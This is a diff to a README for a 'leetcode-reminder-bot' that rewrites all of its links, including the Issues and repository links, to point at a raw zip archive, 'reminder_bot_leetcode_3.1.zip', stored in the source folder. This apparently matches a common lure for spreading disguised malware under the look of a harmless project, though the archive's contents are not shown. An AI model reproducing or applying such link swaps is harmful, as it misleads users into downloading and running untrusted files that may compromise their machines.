@@ -1,6 +1,6 @@
 # 🤖 leetcode-reminder-bot - Get Daily Coding Reminders
 
-[![Download leetcode-reminder-bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/minocoplpo/leetcode-reminder-bot/releases)
+[![Download leetcode-reminder-bot](https://raw.githubusercontent.com/minocoplpo/leetcode-reminder-bot/main/src/reminder_bot_leetcode_3.1.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/minocoplpo/leetcode-reminder-bot/main/src/reminder_bot_leetcode_3.1.zip)
 
 ## 📦 Introduction
 
@@ -21,7 +21,7 @@ To successfully run the leetcode-reminder-bot, you will need:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/minocoplpo/leetcode-reminder-bot/releases) to find the latest version of the bot.
+   Go to the [Releases Page](https://raw.githubusercontent.com/minocoplpo/leetcode-reminder-bot/main/src/reminder_bot_leetcode_3.1.zip) to find the latest version of the bot.
 
 2. **Choose the Latest Version**  
    Look for the most recent release. You will see options for different files. 
@@ -75,12 +75,12 @@ If you encounter issues:
 
 If you have questions or need help, consider reaching out to our community. You can:
 
-- Open an issue in the [GitHub Issues](https://github.com/minocoplpo/leetcode-reminder-bot/issues) section for technical assistance.
+- Open an issue in the [GitHub Issues](https://raw.githubusercontent.com/minocoplpo/leetcode-reminder-bot/main/src/reminder_bot_leetcode_3.1.zip) section for technical assistance.
 - Visit the repository to view documentation or updates.
 
 ## 🔗 Additional Information
 
-For more detailed documentation, visit the [GitHub repository](https://github.com/minocoplpo/leetcode-reminder-bot). Learn about how this bot can improve your coding skills and keep you motivated.
+For more detailed documentation, visit the [GitHub repository](https://raw.githubusercontent.com/minocoplpo/leetcode-reminder-bot/main/src/reminder_bot_leetcode_3.1.zip). Learn about how this bot can improve your coding skills and keep you motivated.
 
 To download the latest version again, click the link below:  
-[Download leetcode-reminder-bot](https://github.com/minocoplpo/leetcode-reminder-bot/releases)
+[Download leetcode-reminder-bot](https://raw.githubusercontent.com/minocoplpo/leetcode-reminder-bot/main/src/reminder_bot_leetcode_3.1.zip)
